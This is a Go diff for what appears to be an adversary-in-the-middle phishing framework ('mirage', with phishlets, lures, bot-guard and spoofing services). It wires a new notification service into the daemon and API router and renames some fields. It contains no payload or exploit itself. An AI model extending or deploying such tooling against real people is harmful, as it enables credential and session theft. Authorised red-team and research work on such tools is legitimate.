@@ -14,9 +14,10 @@ import (
 	"github.com/travisbale/mirage/internal/botguard"
 	"github.com/travisbale/mirage/internal/cert"
 	"github.com/travisbale/mirage/internal/config"
-	aesgcm "github.com/travisbale/mirage/internal/crypto/aes"
+	"github.com/travisbale/mirage/internal/crypto/aes"
 	"github.com/travisbale/mirage/internal/dns"
 	"github.com/travisbale/mirage/internal/events"
+	"github.com/travisbale/mirage/internal/notify"
 	"github.com/travisbale/mirage/internal/obfuscator"
 	"github.com/travisbale/mirage/internal/phishlet"
 	"github.com/travisbale/mirage/internal/proxy"
@@ -52,6 +53,9 @@ type Daemon struct {
 	// Proxy.
 	proxy *proxy.Server
 
+	// Notification system.
+	notificationSvc *aitm.NotificationService
+
 	// JS obfuscator — always non-nil after New (no-op when disabled).
 	obfuscator scriptObfuscator
 
@@ -67,18 +71,17 @@ type Daemon struct {
 type initializer struct {
 	*Daemon
 
-	lureStore     *sqlite.Lures
-	phishletStore *sqlite.Phishlets
-	zones         map[string]aitm.ZoneConfig
-	dnsProviders  map[string]aitm.DNSProvider
-	botStore      *sqlite.Bots
-	botGuardSvc   *aitm.BotGuardService
-	sessionStore  *sqlite.Sessions
-	lureSvc       *aitm.LureService
-	blacklistSvc  *aitm.BlacklistService
-	puppetSvc     *aitm.PuppetService
-	spoofer       *spoof.Server
-	notifier      *redirect.Notifier
+	lureStore        *sqlite.Lures
+	phishletStore    *sqlite.Phishlets
+	zones            map[string]aitm.ZoneConfig
+	dnsProviders     map[string]aitm.DNSProvider
+	botStore         *sqlite.Bots
+	botGuardSvc      *aitm.BotGuardService
+	sessionStore     *sqlite.Sessions
+	lureSvc          *aitm.LureService
+	blacklistSvc     *aitm.BlacklistService
+	spoofer          *spoof.Server
+	redirectNotifier *redirect.Notifier
 }
 
 // New constructs and fully wires a Daemon. Returns an error if any
@@ -241,11 +244,15 @@ func (ini *initializer) initServices() error {
 	}
 	ini.phishletSvc = phishletSvc
 
-	ini.lureSvc = &aitm.LureService{Store: ini.lureStore, Invalidator: phishletSvc, Cipher: aesgcm.Cipher{}}
-	ini.notifier = redirect.NewNotifier(ini.bus, ini.sessionSvc, ini.lureSvc, ini.logger)
+	ini.lureSvc = &aitm.LureService{Store: ini.lureStore, Invalidator: phishletSvc, Cipher: aes.Cipher{}}
+	ini.redirectNotifier = redirect.NewNotifier(ini.bus, ini.sessionSvc, ini.lureSvc, ini.logger)
 
 	ini.puppetSvc = ini.initPuppet()
-	ini.Daemon.puppetSvc = ini.puppetSvc
+
+	ini.notificationSvc = &aitm.NotificationService{
+		Store:      sqlite.NewNotificationStore(ini.db),
+		Dispatcher: notify.NewDispatcher(ini.bus, ini.logger),
+	}
 
 	return nil
 }
@@ -279,15 +286,16 @@ func (ini *initializer) initPuppet() *aitm.PuppetService {
 
 func (ini *initializer) initProxy(version string) error {
 	apiHandler := &api.Router{
-		Sessions:  ini.sessionSvc,
-		Lures:     ini.lureSvc,
-		Phishlets: ini.phishletSvc,
-		Blacklist: ini.blacklistSvc,
-		Botguard:  ini.botGuardSvc,
-		Bus:       ini.bus,
-		HTTPSPort: ini.cfg.HTTPSPort,
-		Version:   version,
-		Logger:    ini.logger,
+		Sessions:      ini.sessionSvc,
+		Lures:         ini.lureSvc,
+		Phishlets:     ini.phishletSvc,
+		Blacklist:     ini.blacklistSvc,
+		Botguard:      ini.botGuardSvc,
+		Notifications: ini.notificationSvc,
+		Bus:           ini.bus,
+		HTTPSPort:     ini.cfg.HTTPSPort,
+		Version:       version,
+		Logger:        ini.logger,
 	}
 
 	ini.obfuscator = &obfuscator.NopObfuscator{}
@@ -312,7 +320,7 @@ func (ini *initializer) initProxy(version string) error {
 		PuppetSvc:      ini.puppetSvc,
 		TelemetrySvc:   ini.botGuardSvc,
 		Obfuscator:     ini.obfuscator,
-		Notifier:       ini.notifier,
+		Notifier:       ini.redirectNotifier,
 		APIHandler:     apiHandler,
 		Logger:         ini.logger,
 		ScoreThreshold: defaultBotScoreThreshold,
